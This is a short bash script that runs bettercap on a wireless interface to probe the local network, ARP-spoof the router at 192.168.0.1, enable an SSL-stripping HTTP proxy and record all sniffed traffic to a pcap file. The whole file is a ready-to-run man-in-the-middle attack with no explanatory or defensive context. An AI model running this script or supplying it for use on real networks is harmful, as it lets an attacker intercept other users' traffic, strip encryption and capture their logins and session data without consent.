#!/bin/bash

sleep 1

DATE_BIN=$(command -v date)
d=`${DATE_BIN} +%d-%m-%y_%H.%M.%S`

bettercap -iface wlan0 -eval "net.probe on; net.show; set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.0.1; set http.proxy.ssltrip true; http.proxy on; set net.sniff.output 'bettercap-log_$d_192.168.0.x.pcap'; arp.spoof on; net.sniff on"

exit 0

